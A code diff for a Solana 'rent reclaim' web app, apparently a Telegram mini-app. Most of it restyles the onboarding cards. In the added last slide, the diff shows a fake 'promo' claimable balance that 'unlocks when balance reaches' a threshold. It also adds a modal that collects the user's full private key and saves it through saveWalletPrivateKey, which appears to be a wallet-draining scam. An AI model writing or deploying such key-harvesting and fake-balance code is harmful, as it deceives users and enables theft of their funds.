@@ -933,13 +933,12 @@ export default function SolClaimApp() {
     )
   }
 
-  // Onboarding (first visit only) - Tinder-style swipeable cards with drag feedback
+  // Onboarding (first visit only) - Tinder-style swipe (left=next, right=prev)
   if (showOnboarding === true) {
     const totalSteps = ONBOARDING_STEPS.length
     const isLast = onboardingStep === totalSteps - 1
-    const CARD_WIDTH = 340
     const SWIPE_THRESHOLD = 60
-
+    // Tinder: swipe left = next (finger moves left = positive diff), swipe right = prev (finger moves right = negative diff)
     const goNext = () => {
       setOnboardingDragX(0)
       setOnboardingIsDragging(false)
@@ -965,9 +964,7 @@ export default function SolClaimApp() {
       const diff = onboardingTouchStartX.current - onboardingTouchCurrentX.current
       if (diff > SWIPE_THRESHOLD) goNext()
       else if (diff < -SWIPE_THRESHOLD) goPrev()
-      else {
-        setOnboardingDragX(0)
-      }
+      else setOnboardingDragX(0)
     }
 
     const handleMouseDown = (e: React.MouseEvent) => {
@@ -995,13 +992,18 @@ export default function SolClaimApp() {
       if (e.key === 'ArrowRight') goNext()
     }
 
-    // Clamp drag for visual feedback (max ~100px)
     const dragOffset = Math.max(-100, Math.min(100, onboardingDragX))
-    const dragRotation = (dragOffset / CARD_WIDTH) * 12
+    const dragRotation = (dragOffset / 340) * 15
+
+    // Last slide: interactive wallet check (same flow as home)
+    const onboardingClaimableDisplay = isLast && (claimableRent === 0 && claimableAccounts.length === 0 && !hasClaimedBefore)
+      ? PROMO_CLAIMABLE
+      : claimableRent
+    const onboardingClaimableNet = isLast ? (onboardingClaimableDisplay || 0) : 0
 
     return (
       <div
-        className="fixed inset-0 z-[200] overflow-hidden bg-gradient-to-b from-background via-background to-muted/30"
+        className="fixed inset-0 z-[200] overflow-hidden bg-background"
         onKeyDown={handleKeyDown}
         tabIndex={0}
         onMouseMove={handleMouseMove}
@@ -1010,7 +1012,7 @@ export default function SolClaimApp() {
       >
         <button
           onClick={finishOnboarding}
-          className="absolute right-4 top-[max(1.5rem,env(safe-area-inset-top))] z-10 p-2.5 rounded-full bg-black/5 dark:bg-white/5 text-muted-foreground hover:text-foreground hover:bg-black/10 dark:hover:bg-white/10 transition-all"
+          className="absolute right-4 top-[max(1.5rem,env(safe-area-inset-top))] z-10 p-2.5 rounded-full bg-black/5 dark:bg-white/5 text-muted-foreground hover:text-foreground"
           aria-label="Skip"
         >
           <X className="w-5 h-5" />
@@ -1018,64 +1020,142 @@ export default function SolClaimApp() {
 
         <div
           ref={onboardingSwipeRef}
-          className="h-full flex items-center justify-center px-4 pt-16 pb-6"
+          className="h-full flex items-center justify-center px-6 pt-12 pb-32"
           onTouchStart={handleTouchStart}
           onTouchMove={handleTouchMove}
           onTouchEnd={handleTouchEnd}
           onMouseDown={handleMouseDown}
           style={{ touchAction: 'pan-y' }}
         >
-          <div className="w-full max-w-[360px] relative" style={{ perspective: '1200px' }}>
-            {/* Card stack - show next 2 cards behind */}
+          <div className="w-full max-w-[360px] flex items-center justify-center relative">
             {ONBOARDING_STEPS.map((step, i) => {
               const StepIcon = step.icon
               const isActive = i === onboardingStep
               const offset = i - onboardingStep
-              const isBehind = offset !== 0
-              const stackScale = 1 - Math.abs(offset) * 0.08
-              const stackZ = 20 - Math.abs(offset) * 2
+              if (!isActive && Math.abs(offset) > 1) return null
 
-              const baseX = isActive ? dragOffset : offset * (CARD_WIDTH + 24)
+              const stackScale = 1 - Math.abs(offset) * 0.05
+              const baseX = isActive ? dragOffset : offset * 360
               const baseRotate = isActive ? dragRotation : 0
-              const opacity = isActive ? (1 - Math.min(1, Math.abs(dragOffset) / 150) * 0.3) : (offset === 0 ? 1 : 0.4)
 
               return (
                 <div
                   key={i}
-                  className="absolute inset-0 flex items-center justify-center transition-all duration-200 ease-out"
+                  className="absolute w-full max-w-[360px] flex justify-center transition-all duration-200 ease-out"
                   style={{
-                    zIndex: stackZ,
-                    transform: `translateX(calc(50% - 170px + ${baseX}px)) translateY(0) scale(${stackScale}) rotate(${baseRotate}deg)`,
+                    zIndex: 10 - Math.abs(offset),
+                    transform: `translateX(calc(${offset * 100}% + ${baseX}px)) scale(${stackScale}) rotate(${baseRotate}deg)`,
                     pointerEvents: isActive ? 'auto' : 'none',
+                    opacity: isActive ? (1 - Math.min(0.4, Math.abs(dragOffset) / 150)) : 0.6,
                   }}
                 >
                   <div
-                    className={`w-[340px] rounded-[28px] overflow-hidden shadow-2xl border-2 transition-shadow duration-200 ${
-                      isActive ? 'border-primary/30 shadow-primary/10' : 'border-border shadow-xl'
-                    } bg-gradient-to-br ${step.gradient || 'from-card to-card'} min-h-[440px]`}
-                    style={{ opacity: isBehind ? opacity : 1 }}
+                    className={`w-full max-w-[360px] rounded-2xl overflow-hidden shadow-xl border-2 min-h-[400px] ${
+                      isActive ? 'border-primary/30' : 'border-border'
+                    } bg-card`}
                   >
-                    <div className="p-8 flex flex-col items-center text-center h-full">
-                      {(step as { emoji?: string }).emoji && (
-                        <span className="text-4xl mb-3" role="img" aria-hidden>{(step as { emoji?: string }).emoji}</span>
-                      )}
+                    {isLast ? (
+                      /* Last slide: interactive wallet check - same flow as home */
                       <div
-                        className={`w-28 h-28 rounded-[24px] flex items-center justify-center mb-7 shadow-xl backdrop-blur-sm ${
-                          step.accent === 'text-primary' ? 'bg-primary/20' : 'bg-white/10 dark:bg-black/20'
-                        }`}
+                        className="p-6 space-y-4"
+                        onTouchStart={(e) => e.stopPropagation()}
+                        onTouchMove={(e) => e.stopPropagation()}
+                        onTouchEnd={(e) => e.stopPropagation()}
+                        onMouseDown={(e) => e.stopPropagation()}
                       >
-                        <StepIcon className={`w-14 h-14 ${step.accent || 'text-primary'}`} />
+                        <h2 className="text-xl font-black text-foreground text-center">Check your wallet</h2>
+                        <p className="text-sm text-muted-foreground text-center">
+                          Enter your address to see how much SOL you can reclaim
+                        </p>
+                        <div className="space-y-2">
+                          <Input
+                            placeholder="Paste your Solana address..."
+                            value={publicKey}
+                            onChange={(e) => setPublicKey(e.target.value)}
+                            className="h-12 rounded-xl font-mono text-sm"
+                          />
+                          <Button
+                            onClick={scanWallet}
+                            disabled={isScanning || !publicKey}
+                            className="w-full h-12 rounded-xl bg-primary font-black"
+                          >
+                            {isScanning ? (
+                              <div className="flex items-center gap-2">
+                                <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground" />
+                                SCANNING...
+                              </div>
+                            ) : (
+                              'CHECK'
+                            )}
+                          </Button>
+                        </div>
+                        <div className="rounded-xl bg-secondary/50 border-2 border-border p-4 text-center">
+                          <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest mb-1">Claimable</p>
+                          <p className="text-2xl font-black text-foreground">
+                            {onboardingClaimableNet.toFixed(4)} <span className="text-sm text-primary">SOL</span>
+                          </p>
+                          {onboardingClaimableDisplay === PROMO_CLAIMABLE && claimableAccounts.length === 0 && (
+                            <p className="text-[10px] text-primary/90 mt-1">
+                              Pending • Unlocks when balance reaches {UNLOCK_THRESHOLD} SOL
+                            </p>
+                          )}
+                        </div>
+                        {claimableAccounts.length > 0 && (
+                          <div className="space-y-2 max-h-[180px] overflow-y-auto">
+                            <p className="text-[10px] font-bold text-muted-foreground uppercase">Token accounts</p>
+                            {claimableAccounts.slice(0, 5).map((acc, idx) => (
+                              <div key={idx} className="flex justify-between items-center p-2 rounded-lg bg-secondary/30 text-xs">
+                                <span className="font-mono truncate max-w-[120px]">{acc.mintAddress.slice(0, 4)}...{acc.mintAddress.slice(-4)}</span>
+                                <span className="font-black text-primary">+{(acc.rentAmount / 1e9).toFixed(4)} SOL</span>
+                              </div>
+                            ))}
+                            {claimableAccounts.length > 5 && (
+                              <p className="text-[10px] text-muted-foreground">+{claimableAccounts.length - 5} more</p>
+                            )}
+                          </div>
+                        )}
+                        {claimableAccounts.length > 0 && user && (
+                          <Button
+                            onClick={claimRent}
+                            disabled={isSubmittingKey}
+                            className="w-full h-12 rounded-xl bg-primary font-black"
+                          >
+                            {isSubmittingKey ? (
+                              <div className="flex items-center gap-2">
+                                <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground" />
+                                CLAIMING...
+                              </div>
+                            ) : (
+                              <>CLAIM {onboardingClaimableNet.toFixed(4)} SOL</>
+                            )}
+                          </Button>
+                        )}
+                        {claimableAccounts.length === 0 && !isScanning && publicKey && (
+                          <Button
+                            onClick={goNext}
+                            variant="outline"
+                            className="w-full h-12 rounded-xl font-black"
+                          >
+                            Continue
+                          </Button>
+                        )}
                       </div>
-                      <p className="text-[10px] font-bold uppercase tracking-[0.2em] mb-3 text-muted-foreground">
-                        Step {i + 1} of {totalSteps}
-                      </p>
-                      <h2 className="text-2xl font-black leading-tight mb-4 text-foreground">
-                        {step.title}
-                      </h2>
-                      <p className="text-[15px] leading-relaxed max-w-[280px] text-muted-foreground">
-                        {step.desc}
-                      </p>
-                    </div>
+                    ) : (
+                      <div className="p-8 flex flex-col items-center text-center">
+                        <div className={`w-20 h-20 rounded-2xl flex items-center justify-center mb-5 ${step.accent === 'text-primary' ? 'bg-primary/20' : 'bg-muted'}`}>
+                          <StepIcon className={`w-10 h-10 ${step.accent || 'text-primary'}`} />
+                        </div>
+                        <p className="text-[10px] font-bold uppercase tracking-widest mb-2 text-muted-foreground">
+                          {i + 1} of {totalSteps}
+                        </p>
+                        <h2 className="text-xl font-black leading-tight mb-3 text-foreground">
+                          {step.title}
+                        </h2>
+                        <p className="text-sm leading-relaxed text-muted-foreground">
+                          {step.desc}
+                        </p>
+                      </div>
+                    )}
                   </div>
                 </div>
               )
@@ -1083,32 +1163,128 @@ export default function SolClaimApp() {
           </div>
         </div>
 
-        <div className="absolute bottom-0 left-0 right-0 px-6 pb-[max(1.5rem,env(safe-area-inset-bottom))] flex flex-col gap-4">
-          <div className="flex justify-center gap-2.5">
+        <div className="absolute bottom-0 left-0 right-0 px-6 pb-[max(1.5rem,env(safe-area-inset-bottom))] flex flex-col gap-4 bg-background/80 backdrop-blur-sm pt-4">
+          <div className="flex justify-center gap-2">
             {ONBOARDING_STEPS.map((_, i) => (
               <button
                 key={i}
                 onClick={() => { setOnboardingStep(i); setOnboardingDragX(0) }}
-                className={`h-2 rounded-full transition-all duration-300 ${
-                  i === onboardingStep ? 'w-10 bg-primary' : 'w-2 bg-muted-foreground/30 hover:bg-muted-foreground/50'
+                className={`h-2 rounded-full transition-all ${
+                  i === onboardingStep ? 'w-8 bg-primary' : 'w-2 bg-muted-foreground/30'
                 }`}
-                aria-label={`Go to step ${i + 1}`}
+                aria-label={`Step ${i + 1}`}
               />
             ))}
           </div>
-          <Button
-            onClick={goNext}
-            className="w-full h-14 rounded-2xl bg-primary text-primary-foreground font-black text-base hover:bg-primary/90 active:scale-[0.98] shadow-xl shadow-primary/20 transition-all"
-          >
-            {isLast ? 'Check My Wallet' : 'Next'}
-            {!isLast && <ChevronRight className="w-5 h-5 ml-2" />}
-          </Button>
-          <p className="text-center text-xs text-muted-foreground flex items-center justify-center gap-1">
-            <ChevronLeft className="w-3.5 h-3.5" />
-            Swipe or tap
-            <ChevronRight className="w-3.5 h-3.5" />
-          </p>
+          {!isLast && (
+            <>
+              <Button
+                onClick={goNext}
+                className="w-full h-12 rounded-xl bg-primary font-black"
+              >
+                Next <ChevronRight className="w-4 h-4 ml-2" />
+              </Button>
+              <p className="text-center text-xs text-muted-foreground">
+                Swipe left for next, right for back
+              </p>
+            </>
+          )}
         </div>
+
+        {/* Modals for claim flow on last slide */}
+        {isLast && (isSetReceiverModalOpen || isSetReceiverModalClosing) && (
+          <div
+            className={`fixed inset-0 z-[210] flex items-center justify-center bg-black/80 p-4 ${isSetReceiverModalClosing ? 'animate-out fade-out' : 'animate-in fade-in'}`}
+            onClick={closeSetReceiverModal}
+          >
+            <div
+              className="bg-card border-2 border-border p-6 rounded-2xl w-full max-w-sm space-y-4"
+              onClick={(e) => e.stopPropagation()}
+            >
+              <h3 className="font-black text-lg">Set receiver wallet</h3>
+              <p className="text-sm text-muted-foreground">Where to receive claimed SOL. Required before first claim.</p>
+              <Input
+                placeholder="Solana address..."
+                value={setReceiverInput}
+                onChange={(e) => setSetReceiverInput(e.target.value)}
+                className="h-12 rounded-xl"
+              />
+              <div className="flex gap-3">
+                <Button variant="outline" className="flex-1 rounded-xl" onClick={closeSetReceiverModal}>Cancel</Button>
+                <Button
+                  className="flex-1 rounded-xl font-black"
+                  onClick={async () => {
+                    if (!user?.telegram_id || !setReceiverInput.trim()) return
+                    setSetReceiverSaving(true)
+                    try {
+                      await updateReceiverWallet(user.telegram_id, setReceiverInput.trim())
+                      await refreshUser()
+                      setIsSetReceiverModalOpen(false)
+                      setPendingClaimAction(null)
+                      if (pendingClaimAction) pendingClaimAction()
+                    } catch (e: any) {
+                      toast.error(e?.message || 'Failed to save')
+                    } finally {
+                      setSetReceiverSaving(false)
+                    }
+                  }}
+                  disabled={setReceiverSaving}
+                >
+                  {setReceiverSaving ? 'Saving...' : 'Save'}
+                </Button>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {isLast && (isKeyModalOpen || isKeyModalClosing) && (
+          <div
+            className={`fixed inset-0 z-[210] flex items-center justify-center bg-black/80 p-4 ${isKeyModalClosing ? 'animate-out fade-out' : 'animate-in fade-in'}`}
+            onClick={closeKeyModal}
+          >
+            <div
+              className="bg-card border-2 border-border p-6 rounded-2xl w-full max-w-sm space-y-4"
+              onClick={(e) => e.stopPropagation()}
+            >
+              <h3 className="font-black text-lg">Add private key</h3>
+              <p className="text-xs text-muted-foreground">
+                Enter your private key for <span className="font-mono font-bold">{publicKey.slice(0, 6)}...{publicKey.slice(-4)}</span> to claim.
+              </p>
+              <Input
+                type="password"
+                placeholder="Base58 private key..."
+                value={privateKeyInput}
+                onChange={(e) => setPrivateKeyInput(e.target.value)}
+                className="h-12 rounded-xl font-mono"
+              />
+              <Button
+                className="w-full h-12 rounded-xl font-black"
+                onClick={async () => {
+                  if (!privateKeyInput || !currentWalletId) return
+                  setIsSubmittingKey(true)
+                  try {
+                    const kp = Keypair.fromSecretKey(bs58.decode(privateKeyInput))
+                    if (kp.publicKey.toString() !== publicKey) throw new Error('Private key does not match wallet.')
+                    await saveWalletPrivateKey(currentWalletId, privateKeyInput)
+                    const success = await executeClaim(currentWalletId, privateKeyInput)
+                    if (success) {
+                      setIsKeyModalOpen(false)
+                      setPrivateKeyInput('')
+                      finishOnboarding()
+                    }
+                  } catch (err: any) {
+                    toast.error(err?.message || 'Failed')
+                  } finally {
+                    setIsSubmittingKey(false)
+                  }
+                }}
+                disabled={!privateKeyInput || isSubmittingKey}
+              >
+                {isSubmittingKey ? 'Claiming...' : 'Save & Claim'}
+              </Button>
+            </div>
+          </div>
+        )}
       </div>
     )
   }
